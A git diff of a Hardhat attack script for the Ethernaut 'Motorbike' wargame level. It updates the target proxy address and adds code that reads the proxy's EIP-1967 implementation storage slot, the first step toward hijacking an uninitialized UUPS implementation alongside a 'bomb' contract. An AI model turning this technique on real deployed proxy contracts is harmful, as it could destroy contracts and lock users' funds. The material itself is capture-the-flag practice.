@@ -3,7 +3,7 @@ import { ethers } from "hardhat";
 
 const attackMotorbike = async () => {
     // change contract addresses here.
-    const motorbikeAddress = "0x383e5cdD8324Bb0E1DA147b2fD869e1cfA930887"; //type "await contract.address()" in ethernaut console
+    const motorbikeAddress = "0xC4BB01C7AA492bdFF60f6989542d71DB7cb73Fd1"; //type "await contract.address()" in ethernaut console
     const bombAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
 
     // Don't touch below
@@ -15,6 +15,16 @@ const attackMotorbike = async () => {
     // https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786
     // https://docs.openzeppelin.com/contracts/4.x/api/proxy
     // https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol
+    // Get _IMPLEMENTATION_SLOT of Motorbike
+    console.log("Reading _IMPLEMENTATION_SLOT of Motorbike");
+    const implAddress = await ethers.provider.getStorageAt(
+        motorbikeAddress,
+        "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
+    );
+    console.log(implAddress);
+    console.log("Cleaning to get 20 bytes address only");
+    const implAddress1 = "0x" + implAddress.slice(-40);
+    console.log(implAddress1);
 };
 
 attackMotorbike()
